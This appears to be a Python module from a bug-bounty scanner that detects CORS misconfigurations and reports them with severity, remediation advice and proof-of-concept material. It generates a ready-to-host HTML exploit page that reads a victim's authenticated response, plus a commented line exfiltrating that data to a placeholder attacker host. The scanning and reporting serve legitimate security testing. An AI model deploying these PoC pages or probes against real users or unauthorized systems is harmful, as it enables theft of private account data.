"""
BLFinder — core/modules/cors_scanner.py
CORS Misconfiguration Scanner

CORS bugs are among the most commonly *missed* findings in automated scans —
most tools focus on exotic business-logic flaws and skip header-based checks
entirely, even though misconfigured CORS is a same-request, no-payload bug
that routinely pays out on HackerOne.

Sends a small set of crafted Origin headers at each endpoint and inspects
whether the server reflects them back with Access-Control-Allow-Credentials.

Checks performed:
  1. Arbitrary origin reflection + credentials:true
     → any attacker-controlled site can read authenticated responses
       (full cross-origin account takeover from the browser's perspective).
  2. `Origin: null` accepted + credentials:true
     → exploitable via sandboxed iframe / data: URL, bypasses simple
       allow-lists that only check "is this our domain".
  3. Domain-confusion bypass (e.g. allow-list regex matches
     "target.com.evil.com" or "eviltarget.com" instead of only *.target.com)
     → classic naive-regex CORS allow-list bug.
  4. Access-Control-Allow-Origin: * combined with credentials:true
     → invalid per the Fetch spec but still seen in the wild; signals a
       broken CORS setup even where modern browsers would reject it.

Each (host, check_type) is only reported once — CORS behaviour is a property
of the server/middleware, not of an individual endpoint, so repeating the
same finding on every URL would just be noise.
"""

from __future__ import annotations

import random
import string
from urllib.parse import urlparse

from ..models import Finding, Severity, ProofOfConcept


class CORSScanner:
    """
    Usage:
        cors = CORSScanner(scanner)
        findings = await cors.check(url, method)
        scanner.findings.extend(findings)
    """

    def __init__(self, scanner):
        self._scanner = scanner
        self._config = scanner.config
        self._request = scanner._request
        self._reported: set[tuple] = set()   # (host, check_name) already reported

    # ── Public API ───────────────────────────────────────────────────────────

    async def check(self, url: str, method: str = "GET") -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(url)
        host = parsed.netloc
        if not host:
            return findings

        registrable = self._registrable_domain(host)
        nonce = self._nonce()

        probes = [
            ("reflected_arbitrary", f"https://cors-poc-{nonce}.attacker-controlled.test"),
            ("null_origin", "null"),
            ("subdomain_confusion", f"https://{registrable}.attacker-controlled.test"),
            ("prefix_confusion", f"https://evil{registrable}"),
        ]

        for check_name, origin in probes:
            key = (host, check_name)
            if key in self._reported:
                continue

            try:
                status, resp_headers, _, _ = await self._request(
                    method, url, headers={"Origin": origin}
                )
            except Exception as e:
                if self._config.verbose:
                    print(f"[!] CORSScanner probe '{check_name}' on {url}: {e}")
                continue
            if status == 0:
                continue

            acao = self._get_header(resp_headers, "Access-Control-Allow-Origin")
            acac = self._get_header(resp_headers, "Access-Control-Allow-Credentials")
            if not acao:
                continue

            reflects_origin = acao.strip() == origin
            creds_true = bool(acac) and acac.strip().lower() == "true"
            wildcard_with_creds = acao.strip() == "*" and creds_true

            finding = None

            if check_name == "reflected_arbitrary" and reflects_origin and creds_true:
                finding = self._build_finding(
                    url, method, origin, acao, acac, host,
                    title="CORS Misconfiguration — Arbitrary Origin Reflected with Credentials",
                    severity=Severity.CRITICAL,
                    description=(
                        f"`{host}` reflects any `Origin` header back in "
                        f"`Access-Control-Allow-Origin` and sets "
                        f"`Access-Control-Allow-Credentials: true`. Any attacker-controlled "
                        f"website can make credentialed cross-origin requests to this API "
                        f"using the victim's cookies/session and read the response in "
                        f"JavaScript, bypassing the Same-Origin Policy entirely."
                    ),
                    confidence=92, cwe="CWE-942", cvss=8.1,
                )
            elif check_name == "null_origin" and reflects_origin and creds_true:
                finding = self._build_finding(
                    url, method, origin, acao, acac, host,
                    title="CORS Misconfiguration — `null` Origin Accepted with Credentials",
                    severity=Severity.HIGH,
                    description=(
                        f"`{host}` accepts `Origin: null` and reflects it with "
                        f"`Access-Control-Allow-Credentials: true`. A sandboxed iframe "
                        f"(`<iframe sandbox>`) or a `data:` URL sends `Origin: null`, which "
                        f"an attacker can use to make authenticated cross-origin requests "
                        f"even against allow-lists that otherwise look correct."
                    ),
                    confidence=88, cwe="CWE-942", cvss=7.1,
                )
            elif check_name in ("subdomain_confusion", "prefix_confusion") and reflects_origin and creds_true:
                finding = self._build_finding(
                    url, method, origin, acao, acac, host,
                    title="CORS Misconfiguration — Origin Allow-List Bypass via Domain Confusion",
                    severity=Severity.HIGH,
                    description=(
                        f"`{host}`'s CORS allow-list accepted the crafted origin `{origin}` "
                        f"— a domain that merely contains or is prefixed by the real domain "
                        f"name, not a genuine subdomain of it — and reflected it with "
                        f"`Access-Control-Allow-Credentials: true`. This strongly suggests "
                        f"the origin check uses a naive substring or unanchored regex match "
                        f"instead of a proper suffix match. An attacker can register a "
                        f"look-alike domain (e.g. `{registrable}.attacker.com` or "
                        f"`evil{registrable}`) and be granted full CORS access."
                    ),
                    confidence=85, cwe="CWE-942", cvss=7.5,
                )
            elif wildcard_with_creds:
                finding = self._build_finding(
                    url, method, origin, acao, acac, host,
                    title="CORS Misconfiguration — Wildcard Origin with Credentials",
                    severity=Severity.HIGH,
                    description=(
                        f"`{host}` sets `Access-Control-Allow-Origin: *` together with "
                        f"`Access-Control-Allow-Credentials: true`. This combination is "
                        f"invalid per the Fetch/CORS spec and modern browsers should refuse "
                        f"to expose the response, but it indicates a broken CORS "
                        f"configuration that may still be exploitable through older clients, "
                        f"cached proxy responses, or non-browser HTTP stacks."
                    ),
                    confidence=68, cwe="CWE-942", cvss=6.5,
                )

            if finding:
                self._reported.add(key)
                findings.append(finding)

        return findings

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _get_header(self, headers: dict, name: str) -> str | None:
        if not headers:
            return None
        name_l = name.lower()
        for k, v in headers.items():
            if k.lower() == name_l:
                return v
        return None

    def _registrable_domain(self, host: str) -> str:
        """Best-effort eTLD+1 without a public-suffix list — good enough for
        building a plausible confusable test domain, not for real validation."""
        host = host.split(":")[0]
        parts = host.split(".")
        if len(parts) <= 2:
            return host
        return ".".join(parts[-2:])

    def _nonce(self, n: int = 8) -> str:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

    def _html_poc(self, url: str, method: str, origin: str) -> str:
        return f"""<!-- CORS exploit PoC — host on {origin} (or any domain the -->
<!-- server accepts) and have an authenticated victim open this page. -->
<!DOCTYPE html>
<html>
<body>
<h3>CORS PoC</h3>
<pre id="out">Sending cross-origin request...</pre>
<script>
fetch("{url}", {{
  method: "{method}",
  credentials: "include"
}})
  .then(r => r.text())
  .then(body => {{
    document.getElementById("out").textContent = body;
    // In a real attack, exfiltrate `body` to an attacker-controlled server:
    // fetch("https://attacker.example.com/collect", {{method:"POST", body}});
  }})
  .catch(e => document.getElementById("out").textContent = "Error: " + e);
</script>
</body>
</html>"""

    def _build_finding(
        self, url: str, method: str, origin: str, acao: str, acac: str, host: str,
        title: str, severity: Severity, description: str,
        confidence: int, cwe: str, cvss: float,
    ) -> Finding:
        path = urlparse(url).path or "/"

        curl = (
            f'curl -sk -X {method} "{url}" \\\n'
            f'  -H "Origin: {origin}" \\\n'
            f'  -H "Cookie: <victim_session_cookie>" -i'
        )
        python_script = (
            "import requests\n\n"
            f'url = "{url}"\n'
            f'headers = {{"Origin": "{origin}"}}\n'
            f'cookies = {{"session": "<victim_session_cookie>"}}\n'
            f'r = requests.request("{method}", url, headers=headers, cookies=cookies)\n'
            'print(r.status_code)\n'
            'print("Access-Control-Allow-Origin:", r.headers.get("Access-Control-Allow-Origin"))\n'
            'print("Access-Control-Allow-Credentials:", r.headers.get("Access-Control-Allow-Credentials"))\n'
            'print(r.text[:500])\n'
        )
        burp = (
            f"{method} {path} HTTP/1.1\n"
            f"Host: {host}\n"
            f"Origin: {origin}\n"
            f"Cookie: <victim_session_cookie>\n"
            f"Connection: close\n\n"
        )
        poc = ProofOfConcept(
            summary=(
                f"Cross-origin request with `Origin: {origin}` returned "
                f"Access-Control-Allow-Origin: {acao}, "
                f"Access-Control-Allow-Credentials: {acac}"
            ),
            curl_command=curl,
            python_script=python_script,
            burp_request=burp,
            expected_result=(
                "The response reflects the attacker-controlled Origin in "
                "Access-Control-Allow-Origin and sets "
                "Access-Control-Allow-Credentials: true, meaning a browser will "
                "expose the authenticated response body to attacker JavaScript."
            ),
            steps=[
                f"Host the HTML PoC below on any domain (e.g. {origin}).",
                "Have the logged-in victim visit the page.",
                "The page's fetch() call runs with credentials:'include'; the "
                "response is readable by attacker JS because of the headers above.",
                "See attached html_poc for a ready-to-host page.",
            ],
            video_note=(
                "Screen-record the PoC page's output showing the victim's "
                "private API response being read cross-origin."
            ),
        )

        finding = Finding(
            title=title,
            severity=severity,
            category="Security Misconfiguration — CORS",
            description=description,
            request={"method": method, "url": url, "headers": {"Origin": origin}},
            response_summary=(
                f"Access-Control-Allow-Origin: {acao} | "
                f"Access-Control-Allow-Credentials: {acac}"
            ),
            evidence=(
                f"Sent Origin: {origin} → received "
                f"Access-Control-Allow-Origin: {acao}, "
                f"Access-Control-Allow-Credentials: {acac}"
            ),
            recommendation=(
                "Validate Origin against an explicit allow-list using exact string "
                "comparison — never substring or unanchored regex matching. Never "
                "reflect arbitrary Origins when Access-Control-Allow-Credentials is "
                "true. Do not treat 'null' as a valid origin."
            ),
            cwe=cwe, cvss=cvss,
            owasp="API8:2023 Security Misconfiguration",
            confirmed=True,
            confidence=confidence,
            confidence_reasons=[
                f"Origin '{origin}' reflected verbatim in Access-Control-Allow-Origin",
                f"Access-Control-Allow-Credentials: {acac}",
            ],
            endpoint=url,
            parameter="Origin header",
        )
        finding.poc = poc
        # Stash the ready-to-host HTML exploit alongside the finding for
        # report generators that want to attach it (e.g. HackerOne write-up).
        finding.html_poc = self._html_poc(url, method, origin)  # type: ignore[attr-defined]
        return finding
